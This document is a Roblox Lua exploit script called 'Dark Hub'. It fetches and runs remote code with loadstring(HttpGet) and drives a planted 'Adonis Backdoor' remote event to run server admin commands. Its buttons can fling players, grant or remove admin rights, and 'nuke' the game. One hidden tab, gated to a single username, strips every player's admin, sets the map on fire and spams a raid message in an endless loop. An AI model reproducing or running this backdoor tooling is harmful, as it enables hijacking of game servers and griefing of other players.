getgenv().SecureMode = true
local DarkHub = loadstring(game:HttpGet('https://raw.githubusercontent.com/DarkHub-Roblox/Premium-Frontend/refs/heads/main/source.lua'))()
local Patched = false

local Window = DarkHub:CreateWindow({
	Name = "Dark Hub",
	LoadingTitle = "Dark Hub",
	LoadingSubtitle = "Premium Edition",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "DarkHub", -- Create a custom folder for your hub/game
		FileName = "PREMIUM"
	},
	Discord = {
		Enabled = true,
		Invite = "KuWFCrSb3T", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
		RememberJoins = true -- Set this to false to make them join the discord every time they load it up
	},
	KeySystem = true, -- Set this to true to use our key system
	KeySettings = {
		Title = "Dark Hub",
		Subtitle = "Key System",
		Note = "Please complete the whitelist to gain access to Dark Hub.",
		FileName = "DarkHub", -- It is recommended to use something unique as other scripts using DarkHub may overwrite your key file
		SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
		GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like DarkHub to get the key from
		Actions = {
			--[[[1] = {
				Text = 'Click here to copy the key link <--',
				OnPress = function()
					print('Pressed')
				end,
			}--]]
		},
		Key = {
            "3a01c6e3-d874-4e7f-987f-2bb6a4f89b12", 
            "c5e19c5a-7e8d-4fa9-9d2d-1e43d9e8b6b3", 
            "7e95b1a4-2c4d-476b-a4c5-91f2d1b7b459", 
            "17a2fc6d-c273-4bde-99f3-3b2c9e7a4e23", 
            "b3a85d72-09b6-4f92-921a-83f6d8c12e15", 
            "64d13e8b-4a5d-4aef-8e0f-b4e13d9b5d81", 
            "2c19f3b4-1a6d-4e5d-912e-d8f5c2a4b367", 
            "f7d12b3c-8c5a-45fe-90d1-b1a29e4d9c74", 
            "a2b64e9d-7d43-48ea-b6c5-3c5d9f2b1a63"
        }
        
    }
})

local Tab = Window:CreateTab("Home", 4370319235) --4483345743 Title, Image
local Tab = Window:CreateTab("Physics", 4370319235) --4483345743 Title, Image

local Slider = Tab:CreateSlider({
	Name = "Walkspeed",
	Range = {0, 200},
	Increment = 5,
	Suffix = "",
	CurrentValue = 16,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end,
})

local Toggle = Tab:CreateToggle({
	Name = "Flight",
	CurrentValue = false,
	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		if Value == true then
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":fly "..game.Players.LocalPlayer.Name})
		else
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":unfly "..game.Players.LocalPlayer.Name})
		end
	end,
})

local Toggle = Tab:CreateToggle({
	Name = "Noclip",
	CurrentValue = false,
	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		if Value == true then
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":noclip "..game.Players.LocalPlayer.Name})
		else
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":clip "..game.Players.LocalPlayer.Name})
		end
	end,
})

local Toggle = Tab:CreateToggle({
	Name = "God",
	CurrentValue = false,
	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		if Value == true then
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":god "..game.Players.LocalPlayer.Name})
		else
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":ungod "..game.Players.LocalPlayer.Name})
		end
	end,
})

local Input = Tab:CreateInput({
	Name = "Fling",
	PlaceholderText = "Username",
	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
	CharacterLimit = false, --max character limit. Remove or set to false
	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
	RemoveTextAfterFocusLost = true, -- Speaks for itself.
	Callback = function(Text)
		game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":fling "..Text})
	end,
})

local Button = Tab:CreateButton({
	Name = "Nuke",
	Interact = 'Click',
	Callback = function()
		if Patched == false then
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":nuke "..game.Players.LocalPlayer.Name})
		end
	end,
})

local Button = Tab:CreateButton({
	Name = "Building Tools",
	Interact = 'Click',
	Callback = function()
		if Patched == false then
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":btools "..game.Players.LocalPlayer.Name})
		end
	end,
})

local Toggle = Tab:CreateToggle({
	Name = "Invisibility",
	CurrentValue = false,
	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		if Value == true then
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":invisible "..game.Players.LocalPlayer.Name})
		else
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":visible "..game.Players.LocalPlayer.Name})
		end
	end,
})

local Tab = Window:CreateTab("Nametag", 4370319235) -- Title, Image

local Input = Tab:CreateInput({
	Name = "Username",
	PlaceholderText = game.Players.LocalPlayer.Name,
	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
	CharacterLimit = 15, --max character limit. Remove or set to false
	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
	RemoveTextAfterFocusLost = false, -- Speaks for itself.
	Callback = function(Text)
		-- The function that takes place when the input is changed
		-- The variable (Text) is a string for the value in the text box
	end,
})

local Tab = Window:CreateTab("Adonis Admin", 4370319235) -- Title, Image

local Input = Tab:CreateInput({
	Name = "Add Creator Admin",
	PlaceholderText = "Username",
	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
	CharacterLimit = false, --max character limit. Remove or set to false
	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
	RemoveTextAfterFocusLost = true, -- Speaks for itself.
	Callback = function(Text)
		if Patched == false then
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("AddAdmin", {plr = game.Players[Text], level = 1500})
		end
	end,
})

local Input = Tab:CreateInput({
	Name = "Add Admin",
	PlaceholderText = "Username",
	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
	CharacterLimit = false, --max character limit. Remove or set to false
	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
	RemoveTextAfterFocusLost = true, -- Speaks for itself.
	Callback = function(Text)
		if Patched == false then
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("AddAdmin", {plr = game.Players[Text], level = 300})
		end
	end,
})

local Input = Tab:CreateInput({
	Name = "Remove Admin",
	PlaceholderText = "Username",
	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
	CharacterLimit = false, --max character limit. Remove or set to false
	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
	RemoveTextAfterFocusLost = true, -- Speaks for itself.
	Callback = function(Text)
		if Patched == false then
			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("AddAdmin", {plr = game.Players[Text], level = 0})
		end
	end,
})

if game.Players.LocalPlayer.Name == "TimoClipz" then
	print("hi")
	local Tab = Window:CreateTab("Stormzy Exploiting", 4384394237)
	local Button = Tab:CreateButton({
		Name = "Nuke",
		Interact = 'Click',
		Callback = function()
			if Patched == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("AddAdmin", {plr = v, level = 0})
				end
				game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":countdown 3"})
				wait(3)
				game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":nuke "..game.Players.LocalPlayer.Name})
				for i,v in pairs(game.Workspace:GetChildren()) do
					if v:IsA("Part") or v:IsA("Union") then
						v.Material = "CorrodedMetal"
					end
					Instance.new("Fire").Parent = v
				end
				while wait(0.1) do
					game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":n RAIDED BY STORMZY EXPLOITING"})
				end
			end
		end,
	})
	local Tab = Window:CreateTab("Dark Hub Admin", 4384394237)
end
